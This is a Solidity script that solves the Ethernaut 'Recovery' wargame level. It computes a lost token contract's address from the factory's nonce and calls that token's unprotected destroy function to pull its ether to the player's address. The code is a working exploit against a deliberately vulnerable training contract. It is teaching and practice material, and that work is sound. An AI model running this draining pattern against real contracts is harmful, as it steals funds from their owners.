// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

/**
 *
 * Level address: 0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048
 * A contract creator has built a very simple token factory contract. Anyone
 * can create new tokens with ease. After deploying the first token contract,
 * the creator sent 0.001 ether to obtain more tokens. They have since lost the
 * contract address.
 *
 * This level will be completed if you can recover (or remove) the 0.001 ether
 * from the lost contract address.
 *
 */
contract RecoveryScript is Attacker {
    Level private level = Level(0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level, 0.001 ether);

        uint256 nonce = vm.getNonce(address(instance));
        address simpleTokenAddr = vm.computeCreateAddress(instance, nonce - 1);
        SimpleToken simpleToken = SimpleToken(payable(simpleTokenAddr));

        simpleToken.destroy(payable(me.addr));

        require(address(simpleToken).balance == 0, "Failed to recover funds");
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
